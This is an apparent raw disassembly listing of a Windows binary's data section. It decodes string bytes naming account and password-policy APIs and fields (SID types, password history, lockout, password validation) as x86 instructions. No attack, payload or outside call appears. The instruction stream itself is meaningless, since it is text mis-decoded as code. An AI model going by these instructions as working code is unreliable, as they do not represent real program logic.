  40636f:	push   0x73736150
  406374:	ja     0x4063e5
  406376:	jb     0x4063dc
  406378:	add    BYTE PTR [ecx+0x73],cl
  40637b:	push   ebx
  40637c:	je     0x4063f0
  40637e:	outs   dx,DWORD PTR ds:[esi]
  40637f:	outs   dx,BYTE PTR ds:[esi]
  406380:	addr16 push eax
  406382:	popa   
  406383:	jae    0x4063f8
  406385:	ja     0x4063f6
  406387:	jb     0x4063ed
  406389:	add    BYTE PTR [ecx+0x73],cl
  40638c:	push   esp
  40638d:	outs   dx,DWORD PTR ds:[esi]
  40638e:	imul   esp,DWORD PTR [ebp+0x6e],0x49
  406392:	outs   dx,BYTE PTR ds:[esi]
  406393:	inc    ecx
  406394:	fs ins DWORD PTR es:[edi],dx
  406396:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  40639d:	je     0x40640e
  40639f:	jb     0x4063e8
  4063a1:	jb     0x406412
  4063a3:	jne    0x406415
  4063a5:	add    BYTE PTR [edi+0x69],dl
  4063a8:	outs   dx,BYTE PTR ds:[esi]
  4063a9:	outs   dx,DWORD PTR fs:[esi]
  4063ab:	ja     0x406420
  4063ad:	dec    ecx
  4063ae:	fs outs dx,BYTE PTR gs:[esi]
  4063b1:	je     0x40641c
  4063b3:	je     0x40642e
  4063b5:	add    BYTE PTR [ecx+0x73],cl
  4063b8:	dec    esp
  4063b9:	imul   ebp,DWORD PTR [ebp+0x69],0x41646574
  4063c0:	fs ins DWORD PTR es:[edi],dx
  4063c2:	imul   ebp,DWORD PTR [esi+0x0],0x756f7247
  4063c9:	jo     0x406410
  4063cb:	js     0x406436
  4063cd:	jae    0x406443
  4063cf:	jae    0x4063d1
  4063d1:	push   esp
  4063d2:	outs   dx,DWORD PTR ds:[esi]
  4063d3:	imul   esp,DWORD PTR [ebp+0x6e],0x45
  4063d7:	ins    BYTE PTR es:[edi],dx
  4063d8:	gs jbe 0x40643c
  4063db:	je     0x406446
  4063dd:	outs   dx,DWORD PTR ds:[esi]
  4063de:	outs   dx,BYTE PTR ds:[esi]
  4063df:	push   esp
  4063e0:	jns    0x406452
  4063e2:	gs inc esp
  4063e4:	gs popaw 
  4063e7:	jne    0x406455
  4063e9:	je     0x4063eb
  4063eb:	push   esp
  4063ec:	outs   dx,DWORD PTR ds:[esi]
  4063ed:	imul   esp,DWORD PTR [ebp+0x6e],0x45
  4063f1:	ins    BYTE PTR es:[edi],dx
  4063f2:	gs jbe 0x406456
  4063f5:	je     0x406460
  4063f7:	outs   dx,DWORD PTR ds:[esi]
  4063f8:	outs   dx,BYTE PTR ds:[esi]
  4063f9:	push   esp
  4063fa:	jns    0x40646c
  4063fc:	gs inc esi
  4063fe:	jne    0x40646c
  406400:	ins    BYTE PTR es:[edi],dx
  406401:	add    BYTE PTR [edi+ebp*2+0x6b],dl
  406405:	outs   dx,BYTE PTR gs:[esi]
  406407:	inc    ebp
  406408:	ins    BYTE PTR es:[edi],dx
  406409:	gs jbe 0x40646d
  40640c:	je     0x406477
  40640e:	outs   dx,DWORD PTR ds:[esi]
  40640f:	outs   dx,BYTE PTR ds:[esi]
  406410:	push   esp
  406411:	jns    0x406483
  406413:	gs dec esp
  406415:	imul   ebp,DWORD PTR [ebp+0x69],0x646574
  40641c:	push   ebx
  40641d:	imul   esp,DWORD PTR [esp+edx*2+0x79],0x73556570
  406425:	gs jb  0x406428
  406428:	push   ebx
  406429:	imul   esp,DWORD PTR [esp+edx*2+0x79],0x72476570
  406431:	outs   dx,DWORD PTR ds:[esi]
  406432:	jne    0x4064a4
  406434:	add    BYTE PTR [ebx+0x69],dl
  406437:	fs push esp
  406439:	jns    0x4064ab
  40643b:	gs inc esp
  40643d:	outs   dx,DWORD PTR ds:[esi]
  40643e:	ins    DWORD PTR es:[edi],dx
  40643f:	popa   
  406440:	imul   ebp,DWORD PTR [esi+0x0],0x54646953
  406447:	jns    0x4064b9
  406449:	gs inc ecx
  40644b:	ins    BYTE PTR es:[edi],dx
  40644c:	imul   esp,DWORD PTR [ecx+0x73],0x64695300
  406453:	push   esp
  406454:	jns    0x4064c6
  406456:	gs push edi
  406458:	gs ins BYTE PTR es:[edi],dx
  40645a:	ins    BYTE PTR es:[edi],dx
  40645b:	dec    ebx
  40645c:	outs   dx,BYTE PTR ds:[esi]
  40645d:	outs   dx,DWORD PTR ds:[esi]
  40645e:	ja     0x4064ce
  406460:	inc    edi
  406461:	jb     0x4064d2
  406463:	jne    0x4064d5
  406465:	add    BYTE PTR [ebx+0x69],dl
  406468:	fs push esp
  40646a:	jns    0x4064dc
  40646c:	gs inc esp
  40646e:	gs ins BYTE PTR es:[edi],dx
  406470:	gs je  0x4064d8
  406473:	fs inc ecx
  406475:	arpl   WORD PTR [ebx+0x6f],sp
  406478:	jne    0x4064e8
  40647a:	je     0x40647c
  40647c:	push   ebx
  40647d:	imul   esp,DWORD PTR [esp+edx*2+0x79],0x6e496570
  406485:	jbe    0x4064e8
  406487:	ins    BYTE PTR es:[edi],dx
  406488:	imul   esp,DWORD PTR [eax+eax*1+0x53],0x79546469
  406490:	jo     0x4064f7
  406492:	push   ebp
  406493:	outs   dx,BYTE PTR ds:[esi]
  406494:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  406498:	outs   dx,BYTE PTR ds:[esi]
  406499:	add    BYTE PTR [ebx+0x69],dl
  40649c:	fs push esp
  40649e:	jns    0x406510
  4064a0:	gs inc ebx
  4064a2:	outs   dx,DWORD PTR ds:[esi]
  4064a3:	ins    DWORD PTR es:[edi],dx
  4064a4:	jo     0x40651b
  4064a6:	je     0x40650d
  4064a8:	jb     0x4064aa
  4064aa:	dec    ecx
  4064ab:	outs   dx,BYTE PTR ds:[esi]
  4064ac:	jo     0x406523
  4064ae:	je     0x406500
  4064b0:	gs jb  0x406526
  4064b3:	imul   esi,DWORD PTR [ebx+0x74],0x69466465
  4064ba:	gs ins BYTE PTR es:[edi],dx
  4064bc:	fs jae 0x4064bf
  4064bf:	inc    ebx
  4064c0:	ins    BYTE PTR es:[edi],dx
  4064c1:	gs popa 
  4064c3:	jb     0x406515
  4064c5:	popa   
  4064c6:	jae    0x40653b
  4064c8:	ja     0x406539
  4064ca:	jb     0x406530
  4064cc:	add    BYTE PTR [ebp+0x73],dl
  4064cf:	gs jb  0x406513
  4064d2:	arpl   WORD PTR [ebx+0x6f],sp
  4064d5:	jne    0x406545
  4064d7:	je     0x406527
  4064d9:	popa   
  4064da:	ins    DWORD PTR es:[edi],dx
  4064db:	add    BYTE PTR gs:[eax+0x61],cl
  4064df:	jae    0x406549
  4064e1:	gs fs push eax
  4064e4:	popa   
  4064e5:	jae    0x40655a
  4064e7:	ja     0x406558
  4064e9:	jb     0x40654f
  4064eb:	add    BYTE PTR [eax+0x61],dl
  4064ee:	jae    0x406563
  4064f0:	ja     0x406561
  4064f2:	jb     0x406558
  4064f4:	dec    ebp
  4064f5:	jne    0x40656a
  4064f7:	je     0x40653c
  4064f9:	push   0x65676e61
  4064fe:	inc    ecx
  4064ff:	je     0x40654f
  406501:	gs js  0x406578
  406504:	dec    esp
  406505:	outs   dx,DWORD PTR ds:[esi]
  406506:	outs   dx,DWORD PTR ds:[si]
  406508:	outs   dx,BYTE PTR ds:[esi]
  406509:	add    BYTE PTR [ebx+0x6c],al
  40650c:	gs popa 
  40650e:	jb     0x40655c
  406510:	outs   dx,DWORD PTR ds:[esi]
  406511:	arpl   WORD PTR [ebx+0x6f],bp
  406514:	jne    0x40658a
  406516:	add    BYTE PTR [ebx+0x68],al
  406519:	popa   
  40651a:	outs   dx,BYTE PTR ds:[esi]
  40651b:	addr16 gs fs push eax
  40651f:	gs jb  0x406595
  406522:	imul   esi,DWORD PTR [ebx+0x74],0x69466465
  406529:	gs ins BYTE PTR es:[edi],dx
  40652b:	fs jae 0x40652e
  40652e:	push   esi
  40652f:	popa   
  406530:	ins    BYTE PTR es:[edi],dx
  406531:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x536e6f69
  406539:	je     0x40659c
  40653b:	je     0x4065b2
  40653d:	jae    0x40653f
  40653f:	inc    esp
  406540:	ja     0x40658e
  406542:	outs   dx,DWORD PTR ds:[esi]
  406543:	ja     0x406589
  406545:	popa   
  406546:	je     0x4065ad
  406548:	push   esp
  406549:	imul   ebp,DWORD PTR [ebp+0x65],0x48774400
  406550:	imul   esp,DWORD PTR [edi+0x68],0x65746144
  406557:	push   esp
  406558:	imul   ebp,DWORD PTR [ebp+0x65],0x6e654c00
  40655f:	addr16 je 0x4065ca
  406562:	add    BYTE PTR [eax+0x61],cl
  406565:	jae    0x4065cf
  406567:	add    BYTE PTR [eax+0x72],dl
  40656a:	gs jae 0x4065d2
  40656d:	outs   dx,BYTE PTR ds:[esi]
  40656e:	je     0x4065b6
  406570:	imul   esp,DWORD PTR [ebp+0x6c],0x50007364
  406577:	popa   
  406578:	jae    0x4065ed
  40657a:	ja     0x4065eb
  40657c:	jb     0x4065e2
  40657e:	dec    esp
  40657f:	popa   
  406580:	jae    0x4065f6
  406582:	push   ebx
  406583:	gs je  0x406586
  406586:	inc    edx
  406587:	popa   
  406588:	fs push eax
  40658a:	popa   
  40658b:	jae    0x406600
  40658d:	ja     0x4065fe
  40658f:	jb     0x4065f5
  406591:	push   esp
  406592:	imul   ebp,DWORD PTR [ebp+0x65],0x636f4c00
  406599:	imul   ebp,DWORD PTR [edi+0x75],0x74
  40659d:	push   esp
  40659e:	imul   ebp,DWORD PTR [ebp+0x65],0x64614200
  4065a5:	push   eax
  4065a6:	popa   
  4065a7:	jae    0x40661c
  4065a9:	ja     0x40661a
  4065ab:	jb     0x406611
  4065ad:	inc    ebx
  4065ae:	outs   dx,DWORD PTR ds:[esi]
  4065af:	jne    0x40661f
  4065b1:	je     0x4065b3
  4065b3:	push   eax
  4065b4:	popa   
  4065b5:	jae    0x40662a
  4065b7:	ja     0x406628
  4065b9:	jb     0x40661f
  4065bb:	dec    eax
  4065bc:	imul   esi,DWORD PTR [ebx+0x74],0x4c79726f
  4065c3:	outs   dx,BYTE PTR gs:[esi]
  4065c5:	addr16 je 0x406630
  4065c8:	add    BYTE PTR [eax+0x61],dl
  4065cb:	jae    0x406640
  4065cd:	ja     0x40663e
  4065cf:	jb     0x406635
  4065d1:	dec    eax
  4065d2:	imul   esi,DWORD PTR [ebx+0x74],0x79726f
  4065d9:	dec    esi
  4065da:	gs je  0x406633
  4065dd:	popa   
  4065de:	ins    BYTE PTR es:[edi],dx
  4065df:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x74754165
  4065e7:	push   0x69746e65
  4065ec:	arpl   WORD PTR [ecx+0x74],sp
  4065ef:	imul   ebp,DWORD PTR [edi+0x6e],0x74654e00
  4065f6:	push   esi
  4065f7:	popa   
  4065f8:	ins    BYTE PTR es:[edi],dx
  4065f9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x73615065
  406601:	jae    0x40667a
  406603:	outs   dx,DWORD PTR ds:[esi]
  406604:	jb     0x40666a
  406606:	inc    ebx
  406607:	push   0x65676e61
  40660c:	add    BYTE PTR [esi+0x65],cl
  40660f:	je     0x406667
  406611:	popa   
  406612:	ins    BYTE PTR es:[edi],dx
  406613:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x73615065
  40661b:	jae    0x406694
  40661d:	outs   dx,DWORD PTR ds:[esi]
  40661e:	jb     0x406684
  406620:	push   edx
  406621:	gs jae 0x406689
  406624:	je     0x406626
  406626:	dec    esp
  406627:	addr16 jb 0x406697
  40662a:	imul   esi,DWORD PTR [eax],0x6469735f
  406630:	add    BYTE PTR [edx+0x79],ah
  406633:	je     0x40669a
  406635:	xor    BYTE PTR [eax],al
  406637:	bound  edi,QWORD PTR [ecx+0x74]
  40663a:	xor    DWORD PTR gs:[eax],eax
  40663d:	bound  edi,QWORD PTR [ecx+0x74]
  406640:	xor    al,BYTE PTR gs:[eax]
  406643:	bound  edi,QWORD PTR [ecx+0x74]
  406646:	xor    eax,DWORD PTR gs:[eax]
  406649:	bound  edi,QWORD PTR [ecx+0x74]
  40664c:	gs xor al,0x0
  40664f:	bound  edi,QWORD PTR [ecx+0x74]
  406652:	gs xor eax,0x6d6f4300
  406658:	jo     0x4066cf
  40665a:	je     0x4066c1
  40665c:	jb     0x4066ac
  40665e:	popa   
  40665f:	ins    DWORD PTR es:[edi],dx
  406660:	gs dec esi
  406662:	gs je  0x4066a7
  406665:	dec    ecx
  406666:	dec    edi
  406667:	push   ebx
  406668:	add    BYTE PTR [ebx+0x6f],al
  40666b:	ins    DWORD PTR es:[edi],dx
  40666c:	jo     0x4066e3
  40666e:	je     0x4066d5
  406670:	jb     0x4066c0
  406672:	popa   
  406673:	ins    DWORD PTR es:[edi],dx
  406674:	gs inc esp
  406676:	outs   dx,BYTE PTR ds:[esi]
  406677:	jae    0x4066c1
  406679:	outs   dx,DWORD PTR ds:[esi]
  40667a:	jae    0x4066f0
  40667c:	outs   dx,BYTE PTR ds:[esi]
  40667d:	popa   
  40667e:	ins    DWORD PTR es:[edi],dx
  40667f:	add    BYTE PTR gs:[ebx+0x6f],al
  406683:	ins    DWORD PTR es:[edi],dx
  406684:	jo     0x4066fb
  406686:	je     0x4066ed
  406688:	jb     0x4066d8
  40668a:	popa   
  40668b:	ins    DWORD PTR es:[edi],dx
  40668c:	gs inc esp
  40668e:	outs   dx,BYTE PTR ds:[esi]
  40668f:	jae    0x4066d5
  406691:	outs   dx,DWORD PTR ds:[esi]
  406692:	ins    DWORD PTR es:[edi],dx
  406693:	popa   
  406694:	imul   ebp,DWORD PTR [esi+0x0],0x706d6f43
  40669b:	jne    0x406711
  40669d:	gs jb  0x4066ee
  4066a0:	popa   
  4066a1:	ins    DWORD PTR es:[edi],dx
  4066a2:	gs inc esp
  4066a4:	outs   dx,BYTE PTR ds:[esi]
  4066a5:	jae    0x4066ed
  4066a7:	jne    0x406715
  4066a9:	ins    BYTE PTR es:[edi],dx
  4066aa:	jns    0x4066fd
  4066ac:	jne    0x40670f
  4066ae:	ins    BYTE PTR es:[edi],dx
  4066af:	imul   esp,DWORD PTR [esi+0x69],0x43006465
  4066b6:	outs   dx,DWORD PTR ds:[esi]
  4066b7:	ins    DWORD PTR es:[edi],dx
  4066b8:	jo     0x40672f
  4066ba:	je     0x406721
  4066bc:	jb     0x40670c
  4066be:	popa   
  4066bf:	ins    DWORD PTR es:[edi],dx
  4066c0:	gs push eax
  4066c2:	push   0x63697379
  4066c7:	popa   
  4066c8:	ins    BYTE PTR es:[edi],dx
  4066c9:	dec    esi
  4066ca:	gs je  0x40670f
  4066cd:	dec    ecx
  4066ce:	dec    edi
  4066cf:	push   ebx
  4066d0:	add    BYTE PTR [ebx+0x6f],al
  4066d3:	ins    DWORD PTR es:[edi],dx
  4066d4:	jo     0x40674b
  4066d6:	je     0x40673d
  4066d8:	jb     0x406728
  4066da:	popa   
  4066db:	ins    DWORD PTR es:[edi],dx
  4066dc:	gs push eax
  4066de:	push   0x63697379
  4066e3:	popa   
  4066e4:	ins    BYTE PTR es:[edi],dx
  4066e5:	inc    esp
  4066e6:	outs   dx,BYTE PTR ds:[esi]
  4066e7:	jae    0x406731
  4066e9:	outs   dx,DWORD PTR ds:[esi]
  4066ea:	jae    0x406760
  4066ec:	outs   dx,BYTE PTR ds:[esi]
  4066ed:	popa   
  4066ee:	ins    DWORD PTR es:[edi],dx
  4066ef:	add    BYTE PTR gs:[ebx+0x6f],al
  4066f3:	ins    DWORD PTR es:[edi],dx
  4066f4:	jo     0x40676b
  4066f6:	je     0x40675d
  4066f8:	jb     0x406748
  4066fa:	popa   
  4066fb:	ins    DWORD PTR es:[edi],dx
  4066fc:	gs push eax
  4066fe:	push   0x63697379
  406703:	popa   
  406704:	ins    BYTE PTR es:[edi],dx
  406705:	inc    esp
  406706:	outs   dx,BYTE PTR ds:[esi]
  406707:	jae    0x40674d
  406709:	outs   dx,DWORD PTR ds:[esi]
  40670a:	ins    DWORD PTR es:[edi],dx
  40670b:	popa   
  40670c:	imul   ebp,DWORD PTR [esi+0x0],0x706d6f43
  406713:	jne    0x406789
  406715:	gs jb  0x406766
  406718:	popa   
  406719:	ins    DWORD PTR es:[edi],dx
  40671a:	gs push eax
  40671c:	push   0x63697379
  406721:	popa   
  406722:	ins    BYTE PTR es:[edi],dx
  406723:	inc    esp
  406724:	outs   dx,BYTE PTR ds:[esi]
  406725:	jae    0x40676d
  406727:	jne    0x406795
  406729:	ins    BYTE PTR es:[edi],dx
  40672a:	jns    0x40677d
  40672c:	jne    0x40678f
  40672e:	ins    BYTE PTR es:[edi],dx
  40672f:	imul   esp,DWORD PTR [esi+0x69],0x47006465
  406736:	gs je  0x40678d
  406739:	outs   dx,DWORD PTR ds:[esi]
  40673a:	imul   esp,DWORD PTR [ebp+0x6e],0x49
  40673e:	outs   dx,BYTE PTR ds:[esi]
  40673f:	outs   dx,WORD PTR ds:[esi]
  406741:	jb     0x4067b0
  406743:	popa   
  406744:	je     0x4067af
  406746:	outs   dx,DWORD PTR ds:[esi]
  406747:	outs   dx,BYTE PTR ds:[esi]
  406748:	add    BYTE PTR [edi+ebp*2+0x67],cl
  40674c:	outs   dx,DWORD PTR ds:[esi]
  40674d:	outs   dx,BYTE PTR ds:[esi]
  40674e:	push   ebp
  40674f:	jae    0x4067b6
  406751:	jb     0x406753
  406753:	push   ebx
  406754:	jns    0x4067c9
  406756:	je     0x4067bd
  406758:	ins    DWORD PTR es:[edi],dx
  406759:	cs push esp
  40675b:	gs js  0x4067d2
  40675e:	add    BYTE PTR [ebx+0x74],dl
  406761:	jb     0x4067cc
  406763:	outs   dx,BYTE PTR ds:[esi]
  406764:	addr16 inc edx
  406766:	jne    0x4067d1
  406768:	ins    BYTE PTR es:[edi],dx
  406769:	fs gs jb 0x40676d
  40676d:	dec    esp
  40676e:	outs   dx,DWORD PTR ds:[esi]
  40676f:	outs   dx,DWORD PTR ds:[esi]
  406770:	imul   esi,DWORD PTR [ebp+0x70],0x41
  406774:	arpl   WORD PTR [ebx+0x6f],sp
  406777:	jne    0x4067e7
  406779:	je     0x4067c9
  40677b:	popa   
  40677c:	ins    DWORD PTR es:[edi],dx
  40677d:	add    BYTE PTR gs:[edi+ebp*2+0x6f],cl
  406782:	imul   esi,DWORD PTR [ebp+0x70],0x41
  406786:	arpl   WORD PTR [ebx+0x6f],sp
  406789:	jne    0x4067f9
  40678b:	je     0x4067e0
  40678d:	imul   esp,DWORD PTR [eax+eax*1+0x4e],0x6f4c7465
  406795:	arpl   WORD PTR [ecx+0x6c],sp
  406798:	inc    edi
  406799:	jb     0x40680a
  40679b:	jne    0x40680d
  40679d:	inc    ecx
  40679e:	fs fs dec ebp
  4067a1:	gs ins DWORD PTR es:[edi],dx
  4067a3:	bound  esp,QWORD PTR [ebp+0x72]
  4067a6:	jae    0x4067a8
  4067a8:	dec    esi
  4067a9:	gs je  0x4067f8
  4067ac:	outs   dx,DWORD PTR ds:[esi]
  4067ad:	arpl   WORD PTR [ecx+0x6c],sp
  4067b0:	inc    edi
  4067b1:	jb     0x406822
  4067b3:	jne    0x406825
  4067b5:	inc    esp
  4067b6:	gs ins BYTE PTR es:[edi],dx
  4067b8:	dec    ebp
  4067b9:	gs ins DWORD PTR es:[edi],dx
  4067bb:	bound  esp,QWORD PTR [ebp+0x72]
  4067be:	jae    0x4067c0
  4067c0:	dec    esi
  4067c1:	gs je  0x406810
  4067c4:	outs   dx,DWORD PTR ds:[esi]
  4067c5:	arpl   WORD PTR [ecx+0x6c],sp
  4067c8:	inc    edi
  4067c9:	jb     0x40683a
  4067cb:	jne    0x40683d
  4067cd:	inc    edi
  4067ce:	gs je  0x40681a
  4067d1:	outs   dx,BYTE PTR ds:[esi]
  4067d2:	outs   dx,WORD PTR ds:[esi]
  4067d4:	add    BYTE PTR [esi+0x65],cl
  4067d7:	je     0x40682e
  4067d9:	jae    0x406840
  4067db:	jb     0x406821
  4067dd:	gs ins BYTE PTR es:[edi],dx
  4067df:	add    BYTE PTR [esi+0x65],cl
  4067e2:	je     0x40683a
  4067e4:	popa   
  4067e5:	ins    BYTE PTR es:[edi],dx
  4067e6:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x73615065
  4067ee:	jae    0x406867
  4067f0:	outs   dx,DWORD PTR ds:[esi]
  4067f1:	jb     0x406857
  4067f3:	push   eax
  4067f4:	outs   dx,DWORD PTR ds:[esi]
  4067f5:	ins    BYTE PTR es:[edi],dx
  4067f6:	imul   esp,DWORD PTR [ebx+0x79],0x74654e00
  4067fd:	push   esi
  4067fe:	popa   
  4067ff:	ins    BYTE PTR es:[edi],dx
  406800:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x73615065
  406808:	jae    0x406881
  40680a:	outs   dx,DWORD PTR ds:[esi]
  40680b:	jb     0x406871
  40680d:	push   eax
  40680e:	outs   dx,DWORD PTR ds:[esi]
  40680f:	ins    BYTE PTR es:[edi],dx
  406810:	imul   esp,DWORD PTR [ebx+0x79],0x65657246
  406817:	add    BYTE PTR [ecx+0x6c],al
  40681a:	ins    BYTE PTR es:[edi],dx
  40681b:	outs   dx,DWORD PTR ds:[esi]
  40681c:	arpl   WORD PTR [ecx+0x74],sp
  40681f:	gs inc ecx
  406821:	outs   dx,BYTE PTR ds:[esi]
  406822:	fs dec ecx
  406824:	outs   dx,BYTE PTR ds:[esi]
  406825:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40682d:	push   ebx
  40682e:	imul   esp,DWORD PTR [eax+eax*1+0x43],0x6b636568
  406836:	push   esp
  406837:	outs   dx,DWORD PTR ds:[esi]
  406838:	imul   esp,DWORD PTR [ebp+0x6e],0x4d
  40683c:	gs ins DWORD PTR es:[edi],dx
  40683e:	bound  esp,QWORD PTR [ebp+0x72]
  406841:	jae    0x4068ab
  406843:	imul   esi,DWORD PTR [eax+0x0],0x65657246
  40684a:	push   ebx
  40684b:	imul   esp,DWORD PTR [eax+eax*1+0x44],0x696c7075
  406853:	arpl   WORD PTR [ecx+0x74],sp
  406856:	gs push esp
  406858:	outs   dx,DWORD PTR ds:[esi]
  406859:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  40685d:	inc    edi
  40685e:	gs je  0x4068a4
  406861:	outs   dx,DWORD PTR ds:[esi]
  406862:	ins    DWORD PTR es:[edi],dx
  406863:	jo     0x4068da
  406865:	je     0x4068cc
  406867:	jb     0x4068b7
  406869:	popa   
  40686a:	ins    DWORD PTR es:[edi],dx
  40686b:	gs inc ebp
  40686d:	js     0x40686f
  40686f:	dec    esi
  406870:	outs   dx,DWORD PTR ds:[esi]
  406871:	inc    ebp
  406872:	jb     0x4068e6
  406874:	outs   dx,DWORD PTR ds:[esi]
  406875:	jb     0x406877
  406877:	push   eax
  406878:	popa   
  406879:	jae    0x4068ee
  40687b:	ja     0x4068ec
  40687d:	jb     0x4068e3
  40687f:	push   esp
  406880:	outs   dx,DWORD PTR ds:[esi]
  406881:	outs   dx,DWORD PTR ds:[esi]
  406882:	push   ebx
  406883:	push   0x74726f
  406888:	push   eax
  406889:	popa   
  40688a:	jae    0x4068ff
  40688c:	ja     0x4068fd
  40688e:	jb     0x4068f4
  406890:	push   esp
  406891:	outs   dx,DWORD PTR ds:[esi]
  406892:	outs   dx,DWORD PTR ds:[esi]
  406893:	dec    esp
  406894:	outs   dx,DWORD PTR ds:[esi]
  406895:	outs   dx,BYTE PTR ds:[esi]
  406896:	add    BYTE PTR [bx+si+0x61],dl
  40689a:	jae    0x40690f
  40689c:	ja     0x40690d
  40689e:	jb     0x406904
  4068a0:	dec    esi
  4068a1:	outs   dx,DWORD PTR ds:[esi]
  4068a2:	je     0x4068e7
  4068a4:	outs   dx,DWORD PTR ds:[esi]
  4068a5:	ins    DWORD PTR es:[edi],dx
  4068a6:	jo     0x406914
  4068a8:	gs js  0x4068f0
  4068ab:	outs   dx,BYTE PTR ds:[esi]
  4068ac:	outs   dx,DWORD PTR ds:[esi]
  4068ad:	jne    0x406916
  4068af:	push   0x73615000
  4068b4:	jae    0x40692d
  4068b6:	outs   dx,DWORD PTR ds:[esi]
  4068b7:	jb     0x40691d
  4068b9:	inc    esi
  4068ba:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x72724572
  4068c2:	outs   dx,DWORD PTR ds:[esi]
  4068c3:	jb     0x4068c5
  4068c5:	push   ebp
  4068c6:	outs   dx,BYTE PTR ds:[esi]
  4068c7:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  4068cb:	outs   dx,BYTE PTR ds:[esi]
  4068cc:	inc    ebp
  4068cd:	jb     0x406941
  4068cf:	outs   dx,DWORD PTR ds:[esi]
  4068d0:	jb     0x4068d2
  4068d2:	push   ebp
  4068d3:	outs   dx,BYTE PTR ds:[esi]
  4068d4:	arpl   WORD PTR [ebx+0x68],dx
  4068d7:	popa   
  4068d8:	jb     0x40693f
  4068da:	push   edx
  4068db:	gs addr16 gs js 0x4068e0
  4068e0:	inc    esp
  4068e1:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4068e8:	jns    0x40692f
  4068ea:	js     0x406955
  4068ec:	jae    0x406962
  4068ee:	jae    0x4068f0
  4068f0:	inc    esp
  4068f1:	outs   dx,DWORD PTR ds:[esi]
  4068f2:	gs jae 0x406948
  4068f5:	push   0x45657261
  4068fa:	js     0x406965
  4068fc:	jae    0x406972
  4068fe:	add    BYTE PTR [esi+0x69],al
  406901:	ins    BYTE PTR es:[edi],dx
  406902:	gs inc ebp
  406904:	js     0x40696f
  406906:	jae    0x40697c
  406908:	jae    0x40690a
  40690a:	dec    ecx
  40690b:	jae    0x406951
  40690d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  406914:	jns    0x406964
  406916:	popa   
  406917:	ins    DWORD PTR es:[edi],dx
  406918:	gs push esi
  40691a:	popa   
  40691b:	ins    BYTE PTR es:[edi],dx
  40691c:	imul   esp,DWORD PTR [eax+eax*1+0x49],0x6c694673
  406924:	gs dec esi
  406926:	popa   
  406927:	ins    DWORD PTR es:[edi],dx
  406928:	gs push esi
  40692a:	popa   
  40692b:	ins    BYTE PTR es:[edi],dx
  40692c:	imul   esp,DWORD PTR [eax+eax*1+0x49],0x6e614d73
  406934:	popa   
  406935:	addr16 gs fs inc esi
  406939:	jb     0x40699c
  40693b:	ins    DWORD PTR es:[edi],dx
  40693c:	gs ja  0x4069ae
  40693f:	jb     0x4069ac
  406941:	push   esi
  406942:	gs jb  0x4069b8
  406945:	imul   ebp,DWORD PTR [edi+0x6e],0x696c6156
  40694c:	add    BYTE PTR fs:[ecx+0x73],cl
  406950:	inc    esi
  406951:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x56687461
  406959:	popa   
  40695a:	ins    BYTE PTR es:[edi],dx
  40695b:	imul   esp,DWORD PTR [eax+eax*1+0x4e],0x68537465
  406963:	popa   
  406964:	jb     0x4069cb
  406966:	inc    edi
  406967:	gs je  0x4069b3
  40696a:	outs   dx,BYTE PTR ds:[esi]
  40696b:	outs   dx,WORD PTR ds:[esi]
  40696d:	add    BYTE PTR [ebx+0x75],ah
  406970:	jb     0x4069e4
  406972:	outs   dx,BYTE PTR gs:[esi]
  406974:	je     0x4069b9
  406976:	outs   dx,DWORD PTR ds:[esi]
  406977:	outs   dx,BYTE PTR ds:[esi]
  406978:	imul   sp,WORD PTR [edi+0x50],0x7461
  40697e:	push   0x73795300
  406983:	je     0x4069ea
  406985:	ins    DWORD PTR es:[edi],dx
  406986:	cs push edx
  406988:	jne    0x4069f8
  40698a:	je     0x4069f5
  40698c:	ins    DWORD PTR es:[edi],dx
  40698d:	gs cs dec ecx
  406990:	outs   dx,BYTE PTR ds:[esi]
  406991:	je     0x4069f8
  406993:	jb     0x406a04
  406995:	jo     0x4069ea
  406997:	gs jb  0x406a10
  40699a:	imul   esp,DWORD PTR [ebx+0x65],0x614d0073
  4069a1:	jb     0x406a16
  4069a3:	push   0x73416c61
  4069a8:	inc    ecx
  4069a9:	je     0x406a1f
  4069ab:	jb     0x406a16
  4069ad:	bound  esi,QWORD PTR [ebp+0x74]
  4069b0:	add    BYTE PTR gs:[ebp+0x6e],dl
  4069b4:	ins    DWORD PTR es:[edi],dx
  4069b5:	popa   
  4069b6:	outs   dx,BYTE PTR ds:[esi]
  4069b7:	popa   
  4069b8:	addr16 gs fs push esp
  4069bc:	jns    0x406a2e
  4069be:	add    BYTE PTR gs:[esi+0x4f],ah
  4069c2:	jbe    0x406a29
  4069c4:	jb     0x406a3d
  4069c6:	jb     0x406a31
  4069c8:	je     0x406a2f
  4069ca:	add    BYTE PTR [ebp+0x78],ah
  4069cd:	arpl   WORD PTR [ebp+0x70],sp
  4069d0:	je     0x406a3b
  4069d2:	outs   dx,DWORD PTR ds:[esi]
  4069d3:	outs   dx,BYTE PTR ds:[esi]
  4069d4:	add    BYTE PTR [ecx+0x72],ah
  4069d7:	addr16 jae 0x4069da
  4069da:	jo     0x4069dc
  4069dc:	outs   dx,DWORD PTR ds:[esi]
  4069dd:	jne    0x406a53
  4069df:	jo     0x406a56
  4069e1:	je     0x406a33
  4069e3:	popa   
  4069e4:	je     0x406a4e
  4069e6:	add    BYTE PTR [eax+0x61],dh
  4069e9:	jb     0x406a4c
  4069eb:	ins    DWORD PTR es:[edi],dx
  4069ec:	gs je  0x406a54
  4069ef:	jb     0x406a64
  4069f1:	add    BYTE PTR [ecx+0x0],ch
  4069f4:	jo     0x406a57
  4069f6:	jb     0x406a59
  4069f8:	ins    DWORD PTR es:[edi],dx
  4069f9:	dec    esi
  4069fa:	popa   
  4069fb:	ins    DWORD PTR es:[edi],dx
  4069fc:	add    BYTE PTR gs:[eax+0x61],dh
  406a00:	jb     0x406a63
